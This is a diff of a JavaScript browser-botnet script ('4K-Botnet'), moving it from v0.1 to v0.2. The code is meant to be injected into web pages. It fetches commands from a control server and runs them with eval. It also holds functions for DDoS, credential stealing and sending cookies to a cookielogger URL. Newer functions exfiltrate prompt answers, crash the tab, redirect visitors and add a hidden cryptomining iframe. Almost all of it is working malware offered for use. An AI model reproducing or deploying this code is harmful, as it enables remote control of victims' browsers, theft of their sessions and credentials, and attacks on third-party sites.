@@ -1,16 +1,13 @@
 //4K-Botnet v0.1 by Chowix40
 //I know it's crap but it works (Kinda)
 var SERVER_URL = 'http://example.com/Botnet/'
-console.log('4K-Botnet v0.1 by Chowix40')
+console.log('4K-Botnet v0.2 by Chowix40')
 
 //Stage 0 - Shows it's been injected
 console.log('Hijacked - Stage 0');
 
-//Stage 1 - Tells the server "I'm Here!"
-console.log('Connected to server - Stage 1');
-
-//Stage 2 - Get Commands
-console.log('Got Commands - Stage 2')
+//Stage 1 - Get Commands
+console.log('Got Commands - Stage 1')
 
 function getCMD() {
 var oReqcmd = new XMLHttpRequest();    
@@ -19,16 +16,16 @@ oReqcmd.open("GET", SERVER_URL+"cmds.php");
 oReqcmd.send(null);
 
 function reqListener() {
-console.log('Raw Commands: '+ oReqcmd.responseText)
+console.log('Raw Commands: \n'+ oReqcmd.responseText)
 eval(oReqcmd.responseText)
 }
 }
 
-//Stage 3 - Execute commands
-console.log('Execute commands - Stage 3')
+//Stage 2 - Execute commands
+console.log('Execute commands - Stage 2')
 getCMD()
 
-//Functions - 1. DDoS, 2. Get_Creds, 3. Cookie_Grabber 4. Injectheader 5. promptUser
+//Functions
 
 //1) DDos
 function DDoS() { 
@@ -47,14 +44,14 @@ setInterval(DDosX, 10);
 function DDosX() {  
     
   var TARGET = oReq.responseText
-  var URI = '/index.php?page=index.php'
+  var URI = '/index.php?page=index.html'
   var pic = new Image()
   var rand = Math.floor(Math.random() * 1000)
   pic.src = 'http://'+TARGET+URI+rand+'=val'
 }    
-} //Done, Attack Untested, Needs optimization
+} //Done-ish, Attack Untested, Needs optimization
 
-//2) Get_Creds
+//2) credJacker
 function getCreds() {
 //Original code taken from Gumshoe but modified by Chowix40 
 console.log('4K-Botnet getCreds')
@@ -92,21 +89,21 @@ console.log('4K-Botnet getCreds')
               }
         }; //Done
 
-//3) Cookie_Grabber
+//3) cookieJacker
 function getCookies() {
 //Code taken from http://hackiteasy.blogspot.com/2011/01/session-hijacking-or-cookie-stealing.html
-console.log('Calling the Cookie Monster...')
+console.log('Calling Cookie Monster...')
 var pic = new Image()
 pic.src = SERVER_URL+'cookielogger.php?cookie='+document.cookie
 } //Done 
 
-//5) injectHeader
+//4) injectHeader
 function injectHeader() {
     console.log('Injecting the header: ' + arguments[0])
     d=document;e=d.createElement("h1");e.innerHTML=arguments[0];d.body.appendChild(e)
 } //It works, but Needs work, it inserts header at bottom of page- need to get it on the top, might remove in the future
 
-//6) promptUser
+//5) promptUser
 function promptUser() {
     console.log('Prompting the user: '+arguments[0])
     var promptAnswer = prompt(arguments[0]);
@@ -115,4 +112,30 @@ function promptUser() {
     pic.src = SERVER_URL+'prompt.php?answer='+promptAnswer
 } //Done
 
-//7) ???
+//6) deathTab
+function browserKill() {
+    console.log("Death to all who oppose me!");
+    while(true) {
+    var total = '';
+    for (var i = 0; i < 100000; i++) {total = total + i.toString()}
+    history.pushState(0,0, total );
+};
+} //Done
+
+//7) reDire
+function reDire() {
+    console.log('Redirecting to ' + arguments[0])
+    window.location.replace(arguments[0])
+} //Done
+
+//8) DropandExecute
+function DnE() {
+    console.log("Not Implemented");
+} //Not sure how to do or if possible
+
+//9) MoneroMiner
+function moneyMaker() {
+    document.write("<iframe src=" + SERVER_URL + "mine.html width=0 height=0 hidden></iframe>")
+};
+
+//10 ???
